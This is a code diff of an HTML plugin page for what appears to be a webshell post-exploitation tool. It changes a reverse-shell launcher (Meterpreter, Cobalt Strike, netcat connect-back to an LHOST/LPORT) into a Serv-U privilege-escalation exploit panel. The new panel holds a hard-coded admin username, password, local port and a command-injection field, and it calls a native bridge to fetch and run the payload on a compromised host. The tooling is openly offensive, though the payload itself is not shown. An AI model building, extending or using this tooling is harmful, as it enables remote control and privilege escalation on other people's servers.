@@ -2,7 +2,7 @@
 <html lang="en-US">
 <head>
     <meta charset="UTF-8">
-    <title>Reverse Shell Controller</title>
+    <title>Serv-U PrivEsc</title>
     <style>
         html, body {
             min-height: 100%;
@@ -74,7 +74,7 @@
             font-weight: bold;
         }
         
-        input[type="text"], select { 
+        input[type="text"] { 
             width: 100%; 
             background: #000000; 
             border: 1px solid #ffffff; 
@@ -83,26 +83,10 @@
             border-radius: 0px; 
             box-sizing: border-box; 
             font-family: inherit;
-            font-size: 13px;
         }
-        input[type="text"]:focus, select:focus {
+        input[type="text"]:focus {
             outline: none;
             background: #111111; 
-        }
-        
-        select {
-            appearance: none;
-            -webkit-appearance: none;
-            background-image: url("data:image/svg+xml;utf8,<svg fill='white' height='24' viewBox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'><path d='M7 10l5 5 5-5z'/></path></svg>");
-            background-repeat: no-repeat;
-            background-position-x: 98%;
-            background-position-y: 50%;
-            padding-right: 30px;
-        }
-        
-        select option {
-            background: #000000;
-            color: #ffffff;
         }
         
         button { 
@@ -138,7 +122,7 @@
             background: #000000; 
             border: 1px solid #ffffff; 
             padding: 15px; 
-            height: 220px; 
+            height: 180px; 
             overflow-y: auto; 
             white-space: pre-wrap;
             font-size: 13px;
@@ -146,44 +130,49 @@
         }
 
         .msf-line { margin-bottom: 4px; color: #ffffff; } 
-        .msf-info { color: #3498db; font-weight: bold; }    
-        .msf-success { color: #2ecc71; font-weight: bold; } 
-        .msf-warn { color: #f1c40f; font-weight: bold; }    
-        .msf-error { color: #e74c3c; font-weight: bold; }   
+        .msf-info { color: #3498db; font-weight: bold; }
+        .msf-success { color: #2ecc71; font-weight: bold; }
+        .msf-warn { color: #f1c40f; font-weight: bold; }
+        .msf-error { color: #e74c3c; font-weight: bold; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>[ REVERSE_SHELL_LAUNCHER ]</h2>
+    <h2>[ SERV-U_PRIVESC ]</h2>
     
     <div class="status-bar" id="statusBar">
-        [*] INITIALIZING INTERFACE... AWAITING HOST BRIDGE...
+        [*] INITIALIZING SYSTEM CONTROLLER... AWAITING LOGS...
     </div>
     
     <div class="form-row">
-        <div class="form-group" style="flex: 2;">
-            <label>> LHOST (REMOTE IP)</label>
-            <input type="text" id="txtLhost" value="127.0.0.1" placeholder="e.g. 192.168.1.50">
+        <div class="form-group" style="flex: 3;">
+            <label>> LOCAL PATH</label>
+            <input type="text" id="txtServUIp" value="localhost">
         </div>
         <div class="form-group" style="flex: 1;">
-            <label>> LPORT</label>
-            <input type="text" id="txtLport" value="4444" placeholder="4444">
+            <label>> LOCAL_PORT</label>
+            <input type="text" id="txtServUPort" value="43958">
         </div>
     </div>
 
     <div class="form-row">
-        <div class="form-group full-width">
-            <label>> PAYLOAD PLATFORM (COMBOBOX)</label>
-            <select id="selPayloadType">
-                <option value="meterpreter">METASPLOIT METERPRETER (REVERSE_TCP)</option>
-                <option value="cobaltstrike">COBALT STRIKE BEACON (REVERSE_HTTP)</option>
-                <option value="netcat">NETCAT (NC REVERSE_SHELL)</option>
-            </select>
+        <div class="form-group">
+            <label>> USERNAME</label>
+            <input type="text" id="txtExploitUser" value="LocalAdministrator">
+        </div>
+        <div class="form-group">
+            <label>> PASSWORD</label>
+            <input type="text" id="txtExploitPass" value="#l@$ak#.lk;0@P">
         </div>
     </div>
 
-    <button id="btnConnect" onclick="executePlugin()" disabled>TRIGGER_REVERSE_SHELL</button>
+    <div class="form-group full-width">
+        <label>> ROOT_COMMAND_INJECTION</label>
+        <input type="text" id="txtCommand" value="whoami /all">
+    </div>
+
+    <button id="btnExploit" onclick="executePlugin()" disabled>RUN_EXPLOIT</button>
 
     <h3>SYSTEM_LOG_OUTPUT</h3>
     <div class="console" id="consoleOutput"></div>
@@ -192,17 +181,8 @@
 <script>
     const pluginManifest = {
         "supportedLangs": [
-            "ASHX/NebulaPulsar/DarkMatter",
-            "ASMX/NebulaPulsar/DarkMatter",
-            "ASPX/NebulaPulsar/DarkMatter",
-
-            "PHP/v5.X/OneShell",
-            "PHP/v7.X/OneShell",
             "PHP/v8.X/OneShell",
-
-            "JSP/NebulaPulsar/DarkMatter",
-            "JSPX/NebulaPulsar/DarkMatter",
-            "CFM/NebulaPulsar/DarkMatter",
+            "ASPX/JScript/OneShell"
         ]
     };
 
@@ -240,7 +220,7 @@
 
     window.addEventListener('DOMContentLoaded', async () => {
         const statusBar = document.getElementById('statusBar');
-        const btnConnect = document.getElementById('btnConnect');
+        const btnExploit = document.getElementById('btnExploit');
 
         try {
             if (window.chrome && window.chrome.webview && window.chrome.webview.hostObjects.nativeBridge) {
@@ -249,17 +229,16 @@
 
                 if (pluginManifest.supportedLangs.includes(currentShellType)) {
                     statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-active">${currentShellType.toUpperCase()}</span> // STATUS: READY`;
-                    btnConnect.disabled = false;
-                    appendLog("[*] CONNECTION ESTABLISHED TO WEB CONTEXT.");
-                    appendLog("[*] CORE PAYLOAD LISTENER MATRIX INITIALIZED.");
+                    btnExploit.disabled = false;
+                    appendLog("[*] CONNECTION ESTABLISHED.");
+                    appendLog("[*] READY TO PARSE VULNERABILITY MATRIX.");
                 } else {
                     statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-error">${currentShellType.toUpperCase()}</span> // STATUS: INCOMPATIBLE`;
-                    appendLog(`[-] ABORTED. PLUGIN REQUIRES: [${pluginManifest.supportedLangs.join(', ')}].`);
+                    appendLog(`[-] ABORTED. EXPLOIT REQUIRES: [${pluginManifest.supportedLangs.join(', ')}].`);
                     appendLog(`[-] DETECTED ENVIRONMENT: ${currentShellType}.`);
                 }
             } else {
-                appendLog("[!] BRIDGE_ERROR: HOST_NOT_FOUND. STANDALONE DRY-RUN MODE.");
-                btnConnect.disabled = false;
+                appendLog("[!] BRIDGE_ERROR: HOST_NOT_FOUND. CORE OVERRIDE RE-ROUTE REQUIRED.");
             }
         } catch (e) {
             appendLog("[!] EXCEPTION_CAUGHT: " + e.message.toUpperCase());
@@ -268,34 +247,31 @@
 
     async function executePlugin() {
         const configParams = {
-            lhost: document.getElementById('txtLhost').value,
-            lport: document.getElementById('txtLport').value,
-            payloadType: document.getElementById('selPayloadType').value
+            ip: document.getElementById('txtServUIp').value,
+            port: document.getElementById('txtServUPort').value,
+            user: document.getElementById('txtExploitUser').value,
+            pass: document.getElementById('txtExploitPass').value,
+            cmd: document.getElementById('txtCommand').value
         };
 
-        appendLog(`[*] FETCHING CORE SHELL HANDLER FOR: ${currentShellType.toUpperCase() || "STANDALONE"}`);
-        appendLog(`[*] TARGET ENDPOINT SET -> ${configParams.lhost}:${configParams.lport}`);
-        appendLog(`[*] SELECTED ENGINES: [${configParams.payloadType.toUpperCase()}]`);
+        appendLog(`[*] REQUESTING SCHEMATICS FOR: ${currentShellType.toUpperCase()}`);
 
-        try {
-            if (window.chrome && window.chrome.webview && window.chrome.webview.hostObjects.nativeBridge) {
-                const bridge = window.chrome.webview.hostObjects.nativeBridge;
-                
-                const currentDir = window.location.pathname.substring(1, window.location.pathname.lastIndexOf('/') + 1);
-                const payloadCode = await bridge.fnGetPayload(currentDir, currentShellType, "payload");
-                
-                appendLog(`[+] DISPATCHING CONNECT-BACK COMMAND VIA ${configParams.payloadType.toUpperCase()}...`);
-                
-                const szJsonConfig = JSON.stringify(configParams);
-                const result = await bridge.fnRun(szJsonConfig, payloadCode, currentShellType);
-                
-                appendLog(result.toUpperCase());
-            } else {
-                appendLog(`[!] MOCK EXECUTING: SENDING ${configParams.payloadType.toUpperCase()} TO ${configParams.lhost}:${configParams.lport}`);
-            }
-        } catch (e) {
-            appendLog("[-] EXECUTION FAILED: " + e.message.toUpperCase());
-        }
+        const bridge = window.chrome.webview.hostObjects.nativeBridge;
+
+        const currentDir = window.location.pathname.substring(1, window.location.pathname.lastIndexOf('/') + 1).replace("/", "\\");
+        const payloadCode = await bridge.fnGetPayload(currentDir, currentShellType, "payload");
+        
+        appendLog(`[+] CONNECTING TO LOCAL PORT ${configParams.port}...`);
+        appendLog('[+] INJECTING EXPLOIT MEMORY OVERRIDE...');
+        appendLog('[*] EXECUTING REMOTE SHELL ENGINE...');
+
+        const szJsonConfig = JSON.stringify(configParams);
+
+
+
+        const result = await bridge.fnRun(szJsonConfig, payloadCode, currentShellType);
+        
+        appendLog(result.toUpperCase());
     }
 </script>
 
